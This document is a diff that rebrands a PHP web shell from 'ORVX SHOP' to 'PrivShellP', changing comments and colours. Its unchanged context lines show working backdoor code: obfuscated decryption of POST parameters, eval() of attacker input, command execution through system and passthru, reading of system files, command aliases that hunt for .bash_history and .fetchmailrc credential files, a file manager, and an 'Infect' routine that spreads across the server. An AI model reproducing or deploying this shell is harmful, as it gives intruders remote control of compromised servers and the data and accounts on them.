@@ -1,6 +1,6 @@
 <?php
 error_reporting(0);
-//--------------ORVX SHOP--------------//
+//--------------PrivShellP--------------//
 
 if(array_key_exists('watching',$_POST)){
         $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_REQUEST['pass'];
@@ -28,7 +28,7 @@ $dect = 'FilesMan';
 $dea = md5($_SERVER['HTTP_USER_AGENT']);
 if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
         prototype(md5($_SERVER['HTTP_HOST'])."key", $dea);
-}//--------------ORVX SHOP--------------//
+}//--------------PrivShellP--------------//
 if(empty($_POST['charset']))
         $_POST['charset'] = $dec;
 if (!isset($_POST['ne'])) {
@@ -37,7 +37,7 @@ if (!isset($_POST['ne'])) {
         if(isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
         if(isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
         if(isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
-}//--------------ORVX SHOP--------------//
+}//--------------PrivShellP--------------//
 function decrypt($str,$pwd){
 $pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){
     for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
@@ -225,12 +225,12 @@ if(isset($_REQUEST['pass']) && (md5($_REQUEST['pass']) != $password_shell)){
 "> 
       <div class="card-body">
         <a href="https://orvx.pw" target="_blank" style="
-    color: #7367F0 !important;
+    color: #FF0000 !important;
     background-color: transparent;
 " class="brand-logo">
           
           <h2 class="brand-text text-primary ml-1" style="
-    color: #7367F0 !important;
+    color: #FF0000 !important;
     background-color: transparent;
 ">ORVX-SHOP</h2>
         </a>
@@ -249,8 +249,8 @@ if(isset($_REQUEST['pass']) && (md5($_REQUEST['pass']) != $password_shell)){
           </div>
           <input value="submit" type="submit" name="watching" class="btn btn-primary btn-block waves-effect waves-float waves-light" style="
     color: #FFF;
-    background-color: #7367F0;
-    border-color: #7367F0;
+    background-color: #FF0000;
+    border-color: #FF0000;
 ">
         </form>
 
@@ -467,12 +467,12 @@ if(isset($_REQUEST['email'])){
   "> 
                 <div class="card-body">
                   <a href="https://orvx.pw" target="_blank" style="
-          color: #7367F0 !important;
+          color: #FF0000 !important;
           background-color: transparent;
   " class="brand-logo">
 
                         <h2 class="brand-text text-primary ml-1" style="
-          color: #7367F0 !important;
+          color: #FF0000 !important;
           background-color: transparent;
   ">ORVX-SHOP</h2>
                   </a>
@@ -492,7 +492,7 @@ if(isset($_REQUEST['email'])){
   
                         </div>
                         <div class="form-group">
-                                                                          <button type="submit" class="btn btn-lg float-right" style="border-color: #4839EB !important;background-color: #7367F0 !important;color: #FFFFFF;">Test</button>
+                                                                          <button type="submit" class="btn btn-lg float-right" style="border-color: #4839EB !important;background-color: #FF0000 !important;color: #FFFFFF;">Test</button>
                                                                           
                                                                           <a href="'.$stra.'" type="button" style="border-color: #4E5154;color: #B8C2CC;background-color: transparent;" class="btn btn-md float-left">Back</a>
                                                                           
@@ -553,20 +553,20 @@ $cwd = @getcwd();
 if($os == 'win') {
         $home_cwd = str_replace("\\", "/", $home_cwd);
         $cwd = str_replace("\\", "/", $cwd);
-}//--------------ORVX SHOP--------------//
+}//--------------PrivShellP--------------//
 if($cwd[strlen($cwd)-1] != '/')
         $cwd .= '/';
-//--------------ORVX SHOP--------------//
+//--------------PrivShellP--------------//
 function hardHeader() {
         if(empty($_POST['charset']))
                 $_POST['charset'] = $GLOBALS[$dec];
         echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - ORVX.PW - Shell v3</title><link rel='shortcut icon' href='https://i.imgur.com/BSwJ0QE.png'>
 <style>
-        body {background-color:black; color:#7367F0; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } 
+        body {background-color:black; color:#FF0000; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } 
         body,td,th      {font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
         table.info      {color:white;}
         table#toolsTbl {background-color: black;}
-        span,h1,a       {color:#7367F0 !important;}
+        span,h1,a       {color:#FF0000 !important;}
         span            {font-weight:bolder;}
         h1                      {border-left:5px solid #2E6E9C;color:white !important;padding:2px 5px;font:14pt Verdana;background-color:black;margin:0px;}
         div.content     {padding:5px;margin-left:5px;background-color:#060a10;}
@@ -580,7 +580,7 @@ function hardHeader() {
     margin: 0;
     color: #fff;
     background-color: #555;
-    border: 1px solid #7367F0;
+    border: 1px solid #FF0000;
     font: 9pt Monospace,'Courier New';}
     
         label {position:relative}
@@ -605,7 +605,7 @@ function hardHeader() {
     vertical-align: baseline;
     border-radius: 0.25rem;
     -webkit-transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
-    transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;padding-right: 0.6em;padding-left: 0.6em;border-radius: 10rem;font-weight: 400;box-shadow: 0 0 10px #7367f0;background-color: #7367F0;cursor:pointer;}
+    transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;padding-right: 0.6em;padding-left: 0.6em;border-radius: 10rem;font-weight: 400;box-shadow: 0 0 10px #FF0000;background-color: #FF0000;cursor:pointer;}
         input[type='button']{color: #FFFFFF;display: inline-block;
     padding: 0.35em 0.4em;
     font-size: 80%;
@@ -616,7 +616,7 @@ function hardHeader() {
     vertical-align: baseline;
     border-radius: 0.25rem;
     -webkit-transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
-    transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;padding-right: 0.6em;padding-left: 0.6em;border-radius: 10rem;font-weight: 400;box-shadow: 0 0 10px #7367f0;background-color: #7367F0;cursor:pointer;}
+    transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;padding-right: 0.6em;padding-left: 0.6em;border-radius: 10rem;font-weight: 400;box-shadow: 0 0 10px #FF0000;background-color: #FF0000;cursor:pointer;}
         .l1                     {background-color:#10163A;}
         pre                     {font:9pt Courier New;}
 </style>
@@ -717,7 +717,7 @@ function hardHeader() {
                 for($j=0; $j<=$i; $j++)
                         $cwd_links .= $path[$j].'/';
                 $cwd_links .= "\")'>".$path[$i]."/</a>";
-        }//--------------ORVX SHOP--------------//
+        }//--------------PrivShellP--------------//
         $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
         $opt_charsets = '';
         foreach($charsets as $dokl)
@@ -742,11 +742,11 @@ if(!empty($GLOBALS['password_shell'])){
                 if (is_dir($drive.':\\'))
                         $drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
         }
-        //--------------ORVX SHOP--------------//
+        //--------------PrivShellP--------------//
         echo '<table style="background-color: #559;" class=info cellpadding=3 cellspacing=0 width=100%><tr style="background: #0000009e;"><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
                  '<td><b style="display:none" id="systemshort">'.PHP_OS.'</b><nobr id="systemdet">'.substr(@php_uname(), 0, 120).'</nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br><nobr id="systemphp">'.@phpversion().'</nobr> <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color= #EA5455>ON</font>':'<font color=#28C76F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
                  '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>-</nobr></td></tr></table>'.
-                 '<table style="background-color:black;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div><br><center><a  href="https://orvx.pw" target = "_blank"style="font-size: 20px;font-weight: 600;color: #ea5455 !important;">ORVX SHOP</a></center>';
+                 '<table style="background-color:black;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div><br><center><a  href="https://orvx.pw" target = "_blank"style="font-size: 20px;font-weight: 600;color: #ea5455 !important;">PrivShellP</a></center>';
 }
 function generateRandomString($length) {
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
@@ -795,7 +795,7 @@ function ex($in) {
                 @passthru($in);
                 $dokas = ob_get_clean();
         } elseif (function_exists('system')) {
-                ob_start();//--------------ORVX SHOP--------------//
+                ob_start();//--------------PrivShellP--------------//
                 @system($in);
                 $dokas = ob_get_clean();
         } elseif (function_exists('shell_exec')) {
@@ -837,7 +837,7 @@ function perms($p) {
         $i .= (($p & 0x0002) ? 'w' : '-');
         $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
         return $i;
-}//--------------ORVX SHOP--------------////--------------ORVX SHOP--------------//
+}//--------------PrivShellP--------------////--------------PrivShellP--------------//
 function viewPermsColor($f) {
         if (!@is_readable($f))
                 return '<font color=#EA5455><b>'.perms(@fileperms($f)).'</b></font>';
@@ -874,7 +874,7 @@ function actionRC() {
         } else {
                 eval($_POST['p1']);
         }
-}//--------------ORVX SHOP--------------//
+}//--------------PrivShellP--------------//
 function prototype($k, $v) {
     $_COOKIE[$k] = $v;
     setcookie($k, $v);
@@ -952,7 +952,7 @@ function actionSecInfo() {
                 showSecParam('HDD space', ex('df -h'));
                 showSecParam('Hosts', @file_get_contents('/etc/hosts'));
                                 showSecParam('Mount options', @file_get_contents('/etc/fstab'));
-            }//--------------ORVX SHOP--------------//
+            }//--------------PrivShellP--------------//
         } else {
                 showSecParam('OS Version',ex('ver'));
                 showSecParam('Account Settings', iconv('CP866', 'UTF-8',ex('net accounts')));
@@ -989,7 +989,7 @@ function actionFilesTools() {
                                 fclose($fp);
                         }
                 }
-        }//--------------ORVX SHOP--------------//
+        }//--------------PrivShellP--------------//
         hardHeader();
         echo '<h1>File tools</h1><div class=content>';
         if( !file_exists(@$_POST['p1']) ) {
@@ -1024,7 +1024,7 @@ function actionFilesTools() {
                                 @fclose($fp);
                         }
                         echo '</pre>';
-                        break;//--------------ORVX SHOP--------------//
+                        break;//--------------PrivShellP--------------//
                 case 'highlight':
                         if( @is_readable($_POST['p1']) ) {
                                 echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
@@ -1063,13 +1063,13 @@ function actionFilesTools() {
                 
                         echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
                         $fp = @fopen($_POST['p1'], 'r');
-                        if($fp) {//--------------ORVX SHOP--------------//
+                        if($fp) {//--------------PrivShellP--------------//
                                 while( !@feof($fp) )
                                         echo htmlspecialchars(@fread($fp, 1024));
                                 @fclose($fp);
                         }
                         echo '</textarea><input type=submit value="submit"></form>';
-                        break;//--------------ORVX SHOP--------------//
+                        break;//--------------PrivShellP--------------//
                 case 'hexdump':
                         $c = @file_get_contents($_POST['p1']);
                         $n = 0;
@@ -1119,7 +1119,7 @@ function actionFilesTools() {
                         clearstatcache();
                         echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value="submit"></form>';
                         break;
-                //--------------ORVX SHOP--------------//
+                //--------------PrivShellP--------------//
                 case 'frame':
                         $frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));
                         if ($frameSrc[0] != '/')
@@ -1145,7 +1145,7 @@ if($os == 'win')
                 "ARP Table" => "arp -a",
                 "IP Configuration" => "ipconfig /all"
         );
-else//--------------ORVX SHOP--------------//
+else//--------------PrivShellP--------------//
         $aliases = array(
                 "List dir" => "ls -lha",
                 "list file attributes on a Linux second extended file system" => "lsattr -va",
@@ -1169,7 +1169,7 @@ else//--------------ORVX SHOP--------------//
                 "find .bash_history files in current dir" => "find . -type f -name .bash_history",
                 "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
                 "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
-                "Locate" => "",//--------------ORVX SHOP--------------////--------------ORVX SHOP--------------//
+                "Locate" => "",//--------------PrivShellP--------------////--------------PrivShellP--------------//
                 "locate httpd.conf files" => "locate httpd.conf",
                 "locate vhosts.conf files" => "locate vhosts.conf",
                 "locate proftpd.conf files" => "locate proftpd.conf",
@@ -1203,7 +1203,7 @@ function actionConsole() {
         prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
         if(isset($_POST['ajax'])) {
                 prototype(md5($_SERVER['HTTP_HOST']).'ajax', true);
-                ob_start();//--------------ORVX SHOP--------------//
+                ob_start();//--------------PrivShellP--------------//
                 echo "d.cf.cmd.value='';\n";
                 $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\'\0"));
                 if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match)) {
@@ -1269,7 +1269,7 @@ function actionPhp() {
         if( isset($_POST['ajax']) ) {
                 $_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
                 ob_start();
-                eval($_POST['p1']);//--------------ORVX SHOP--------------//
+                eval($_POST['p1']);//--------------PrivShellP--------------//
                 $temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
                 echo strlen($temp), "\n", $temp;
                 exit; 
@@ -1286,7 +1286,7 @@ function actionPhp() {
                 $tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
                 $tmp = preg_replace('!body, td, th, h2, h2 {.*}!msiU','',$tmp);
                 echo $tmp;
-                echo '</div><br>';//--------------ORVX SHOP--------------//
+                echo '</div><br>';//--------------PrivShellP--------------//
         }
         if(empty($_POST['ajax'])&&!empty($_POST['p1']))
                 $_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
@@ -1305,7 +1305,7 @@ function actionFilesMan() {
         $_COOKIE['f'] = @unserialize($_COOKIE['f']);
     
         if(!empty($_POST['p1'])) {
-                switch($_POST['p1']) {//--------------ORVX SHOP--------------//
+                switch($_POST['p1']) {//--------------PrivShellP--------------//
                         case 'uploadFile':
                                 if ( is_array($_FILES['f']['tmp_name']) ) {
                                         foreach ( $_FILES['f']['tmp_name'] as $i => $tmpName ) {
@@ -1332,7 +1332,7 @@ function actionFilesMan() {
                                                         deleteDir($dokl);
                                                 else
                                                         @unlink($dokl);
-                                        }//--------------ORVX SHOP--------------//
+                                        }//--------------PrivShellP--------------//
                                         closedir($dh);
                                         @rmdir($path);
                                 }
@@ -1712,7 +1712,7 @@ function actionInfect() {
                                         }
                                 }
                         }
-                        echo "<font color=#7367F0 size=14>$i</font>";
+                        echo "<font color=#FF0000 size=14>$i</font>";
                 }else{
                         echo "<form method=post><input type=submit value=Infect name=infet></form>";
                         echo 'Really want to infect the server?&nbsp;<a href=# onclick="g(null,null,\'infect\')">Yes</a></div>';
